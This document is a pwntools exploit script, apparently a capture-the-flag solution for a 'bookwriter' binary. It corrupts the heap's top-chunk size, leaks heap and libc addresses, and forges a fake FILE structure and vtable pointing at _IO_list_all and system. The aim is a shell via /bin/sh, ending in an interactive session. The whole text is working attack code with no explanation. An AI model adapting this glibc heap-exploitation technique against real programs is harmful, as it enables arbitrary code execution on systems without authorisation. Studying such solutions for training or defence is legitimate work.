from pwn import *

context.log_level = "debug"
p = process("./bookwriter")
elf = ELF("./bookwriter")
libc = ELF("./libc.so.6")

def Welcome(author):
    p.recvuntil("Author :")
    p.send(author)

def Add(choice, size, content):
    p.recvuntil("Your choice :")
    p.sendline(str(choice))
    p.recvuntil("Size of page :")
    p.sendline(str(size))
    p.recvuntil("Content :")
    p.send(content)

def View(choice, index):
    p.recvuntil("Your choice :")
    p.sendline(str(choice))
    p.recvuntil("Index of page :")
    p.sendline(str(index))

def Edit(choice, index, content):
    p.recvuntil("Your choice :")
    p.sendline(str(choice))
    p.recvuntil("Index of page :")
    p.sendline(str(index))
    p.recvuntil("Content :")
    p.send(content)

def Information(choice, yesno, show=0):
    p.recvuntil("Your choice :")
    p.sendline(str(choice))
    if show:
        heap_address = u32(p.recvline()[-5:-1])
    p.recvuntil("no:0) ")
    p.sendline(str(yesno))
    return heap_address

author = "A"*0x3c + "B"*0x4
Welcome(author)

#part one
Add(1, 0x18, "A"*0x18)
Edit(3, 0, "B"*0x18)
Edit(3, 0, "\x00"*0x18 + p16(0xfe1) + "\x00")
heap_address = Information(4, 0, 1)
#p.recvuntil("BBBB")
Add(1, 0x1000, "\x00"*0x1000)
#part two

for i in range(7):
    Add(1, 0x50, "A"*0x8)

#gdb.attach(p)
View(2, 3)
p.recvuntil("A"*8)
leak_memory = u64(p.recv(6).ljust(8, "\x00"))
libc_address  = leak_memory - 0x3c4b78
system = libc_address + libc.symbols['system']
_IO_list_all = libc_address + libc.symbols["_IO_list_all"]

log.info("heap_address: %s" % hex(heap_address))
log.info("leak_memory: %s" % hex(leak_memory))
log.info("libc_address: %s" % hex(libc_address))
log.info("system: %s" % hex(system))
log.info("_IO_list_all: %s" % hex(_IO_list_all))

#part three
data = '\x00'*0x2b0
payload  = "/bin/sh\x00" + p64(0x61) + p64(leak_memory) + p64(_IO_list_all - 0x10)
payload += p64(2) + p64(3)
payload = payload.ljust(0xc0, "\x00")
payload += p64(0xffffffffffffffff)
payload = payload.ljust(0xd8, "\x00")
vtable = heap_address + 0x2b0 + 0xd8 + 0x8
payload += p64(vtable)
payload += p64(0)*2 + p64(1) + p64(system)


Edit(3, 0, data + payload)
#gdb.attach(p)
p.recvuntil("Your choice :")
p.sendline("1")
p.recvuntil("Size of page :")
p.sendline(str(0x10))
p.interactive()


